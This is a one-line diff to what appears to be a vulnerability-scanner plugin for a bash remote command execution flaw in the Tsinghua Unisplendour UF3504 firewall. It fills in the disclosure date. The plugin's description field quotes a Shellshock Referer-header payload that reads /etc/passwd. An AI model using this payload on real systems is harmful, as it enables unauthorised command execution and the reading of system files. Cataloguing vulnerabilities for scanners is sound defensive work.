@@ -8,7 +8,7 @@ class Vuln(ABVuln):
     name = '清华紫光硬件防火墙 命令执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.RCE # 漏洞类型
-    disclosure_date = ''  # 漏洞公布时间
+    disclosure_date = '2015-05-24'  # 漏洞公布时间
     desc = '''
         清华紫光硬件防火墙UF3504 3.0版型号BASH远程命令执行漏洞:Referer: () { :;}; echo  `/bin/cat /etc/passwd`
     '''  # 漏洞描述
